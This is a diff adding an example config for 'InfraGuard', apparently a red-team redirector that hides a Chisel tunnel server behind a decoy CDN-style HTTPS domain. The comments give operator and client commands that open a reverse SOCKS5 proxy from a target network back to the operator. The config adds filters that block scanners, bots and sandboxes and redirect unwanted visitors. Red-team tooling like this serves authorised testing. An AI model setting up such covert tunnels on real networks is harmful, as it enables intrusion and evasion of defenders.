@@ -1,0 +1,122 @@
+# ═══════════════════════════════════════════════════════════════════════
+# InfraGuard — Chisel Tunnel Example
+# ═══════════════════════════════════════════════════════════════════════
+#
+# Front a Chisel server with InfraGuard. Chisel speaks HTTPS + WebSocket
+# upgrade, then yamux-multiplexes streams over binary frames. Two routing
+# strategies are shown; pick one.
+#
+#   Strategy A — TCP passthrough (simple, blends as random TCP traffic):
+#     Operator runs `chisel server -p 7777 --reverse` on the team server.
+#     Clients connect to `https://redirector.example.net:7777`. The
+#     tcp_tunnel listener pipes bytes through; TLS handshake terminates
+#     at the chisel server end-to-end.
+#
+#   Strategy B — HTTPS+WebSocket on the main 443 listener (blends as a
+#     normal web service; requires the chisel WebSocket route to be wired
+#     into the HTTP listener — see below).
+#
+# Operator setup:
+#   ./chisel server                         \
+#     --port 7777                           \
+#     --reverse                             \
+#     --tls-key  /etc/chisel/server.key     \
+#     --tls-cert /etc/chisel/server.crt     \
+#     --auth     "ops:${CHISEL_AUTH}"
+#
+# Client (e.g. exposing target-side SOCKS5 back to the operator):
+#   ./chisel client --auth "ops:${CHISEL_AUTH}"      \
+#     https://redirector.example.net:7777            \
+#     R:1080:socks
+#
+# Required env vars:
+#   INFRAGUARD_TLS_CERT   - TLS cert for the cover HTTPS listener
+#   INFRAGUARD_TLS_KEY    - TLS key
+#   INFRAGUARD_DB_PATH    - SQLite path
+#   CHISEL_UPSTREAM_HOST  - team server reachable IP (e.g. 10.3.40.1)
+#   CHISEL_UPSTREAM_PORT  - chisel server port (e.g. 7777)
+#
+# Notes:
+#   * Chisel sends only binary WebSocket frames (yamux). The InfraGuard
+#     WebSocket listener handles both text and binary, but the TCP
+#     passthrough strategy below is the simplest path and recommended
+#     unless you specifically need 443 colocation.
+#   * Chisel embeds its own auth; --auth user:pass is enforced at the
+#     chisel server, not InfraGuard. The IP-intel filter still applies
+#     at the tunnel listener.
+
+listeners:
+  # Cover HTTPS listener for the cdn-style domain. Renders a decoy or
+  # static landing page so direct browser hits don't see a bare TCP RST.
+  - protocol: "https"
+    bind: "0.0.0.0"
+    port: 443
+    tls:
+      cert: "${INFRAGUARD_TLS_CERT}"
+      key: "${INFRAGUARD_TLS_KEY}"
+    domains:
+      - "cdn-assets.example.net"
+
+  # ── Strategy A — Chisel TCP passthrough ──────────────────────────────
+  - protocol: "tcp_tunnel"
+    bind: "0.0.0.0"
+    port: 7777
+    options:
+      upstream_host: "${CHISEL_UPSTREAM_HOST}"
+      upstream_port: ${CHISEL_UPSTREAM_PORT}
+      idle_timeout_seconds: 300
+      profile: "chisel"
+
+  # ── Strategy B — Chisel over HTTPS+WS on 443 (advanced) ──────────────
+  # Uncomment the WebSocket listener block below to colocate chisel on
+  # the main HTTPS front. Requires the WebSocket listener to be wired
+  # into the Starlette app at the chisel client's connect path (default
+  # "/"). The wss upstream points at the internal chisel server's WS
+  # endpoint.
+  #
+  # - protocol: "wss"
+  #   bind: "0.0.0.0"
+  #   port: 443
+  #   options:
+  #     path: "/"
+  #     upstream: "ws://${CHISEL_UPSTREAM_HOST}:${CHISEL_UPSTREAM_PORT}/"
+
+domains:
+  cdn-assets.example.net:
+    upstream: "https://127.0.0.1:9999"   # dummy; drop_action handles
+    profile_type: "passthrough"
+    drop_action:
+      type: "redirect"
+      target: "https://cdn.jsdelivr.net/"
+
+pipeline:
+  filter_mode: "scoring"
+  block_score_threshold: 0.7
+  enable_ip_filter: true
+  enable_bot_filter: true
+  enable_header_filter: true
+  enable_geo_filter: true
+  enable_dns_filter: true
+  enable_profile_filter: false        # opaque tunnel
+  enable_replay_filter: false
+  enable_enumeration_filter: true
+  enable_sandbox_filter: true
+
+intel:
+  auto_block_scanners: true
+  dynamic_whitelist_threshold: 1
+  feeds:
+    enabled: true
+
+tracking:
+  db_path: "${INFRAGUARD_DB_PATH}"
+  retention_days: 30
+
+api:
+  bind: "127.0.0.1"
+  port: 8080
+  health_path: "/up"
+
+logging:
+  level: "INFO"
+  format: "json"
